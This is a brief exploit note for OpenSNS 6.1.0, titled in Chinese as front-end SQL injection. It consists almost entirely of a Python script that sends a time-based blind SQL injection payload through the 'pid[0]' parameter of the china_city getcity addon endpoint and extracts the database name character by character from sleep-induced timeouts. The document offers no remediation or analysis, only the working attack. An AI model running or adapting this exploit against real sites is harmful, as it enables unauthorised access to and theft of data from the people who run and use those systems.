### opensns

```
版本信息：6.1.0
```

#### 前台sql注入

```python
import requests
from requests import exceptions

url = "http://192.168.81.195:50002/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html"

header = {'X-Requested-With': 'XMLHttpRequest'}
# proxies={'http':'127.0.0.1:8080'}
flag = ''
for i in range(1, 50):
    for j in range(32, 128):
        try:
            data = {
                'cid': 0,
                'pid[0]': "=(select if(ord(substr((select database()),{},1))={},sleep(10),0))AND 3 IN  ".format(i, j),
                'pid[1]': 3
            }
            # print data['pid[0]']
            r = requests.post(url, data=data, headers=header, timeout=5)

        except exceptions.Timeout:
            flag += chr(j)
            print(flag)

```

